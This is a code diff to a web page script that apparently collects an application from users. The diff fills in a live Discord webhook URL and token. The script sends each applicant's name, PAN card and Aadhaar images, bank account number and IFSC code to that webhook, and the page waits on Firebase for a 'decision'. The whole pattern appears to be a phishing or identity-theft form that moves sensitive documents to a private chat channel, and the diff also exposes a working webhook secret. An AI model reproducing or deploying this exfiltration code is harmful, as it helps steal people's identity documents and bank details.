@@ -167,8 +167,8 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // --- DISCORD WEBHOOK URL (YAHAN APNA URL PASTE KAREIN) ---
-        const DISCORD_WEBHOOK_URL = "YAHAN_APKA_DISCORD_WEBHOOK_URL_PASTE_KAREIN";
+        // --- DISCORD WEBHOOK URL ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561601570725040228/HNx-tsQAzJzETtLFjDOJonUalwuKPE4iJT84WNtcGuFEH3Ybp5Q0FhznPQEzvBscD6zB";
 
         let currentApplicationId = null;
         let appListener = null;
@@ -220,7 +220,7 @@
                     body: JSON.stringify(discordPayload)
                 });
 
-                // 2. Send Files to Discord (Discord needs multipart/form-data for files)
+                // 2. Send Files to Discord
                 const filesToSend = [
                     { id: 'filePan', name: 'PAN Card' }, 
                     { id: 'fileAadharFront', name: 'Aadhar Front' }, 
@@ -232,7 +232,7 @@
                     if (fileInput.files && fileInput.files.length > 0) {
                         const fd = new FormData();
                         fd.append('payload_json', JSON.stringify({ content: `📄 **${fileObj.name}** - ${formData.fullName}` }));
-                        fd.append('file', fileInput.files[0]); // Discord uses 'file' key for uploads
+                        fd.append('file', fileInput.files[0]); 
                         
                         await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
                     }
@@ -249,7 +249,7 @@
                 showView('view-bank');
             } catch (error) { 
                 document.getElementById('loadingOverlay').classList.remove('active'); 
-                alert("❌ Network Error! Please try again."); 
+                alert("❌ Error: " + error.message); 
                 console.error(error); 
             }
         }
@@ -277,7 +277,7 @@
                     fields: [
                         { name: "👤 Name", value: document.getElementById('fullName').value, inline: true },
                         { name: "🏛️ Bank", value: bankData.bankName, inline: true },
-                        { name: "🔢 Acc No", value: `||${bankData.accNo}||`, inline: false }, // Spoiler tag for privacy
+                        { name: "🔢 Acc No", value: `||${bankData.accNo}||`, inline: false }, 
                         { name: "🏷️ IFSC", value: bankData.ifsc, inline: true }
                     ],
                     timestamp: new Date().toISOString()
@@ -309,7 +309,7 @@
                 startListeningForDecision();
             } catch (error) { 
                 document.getElementById('loadingOverlay').classList.remove('active'); 
-                alert("❌ Network Error!"); 
+                alert("❌ Error: " + error.message); 
                 console.error(error); 
             }
         }
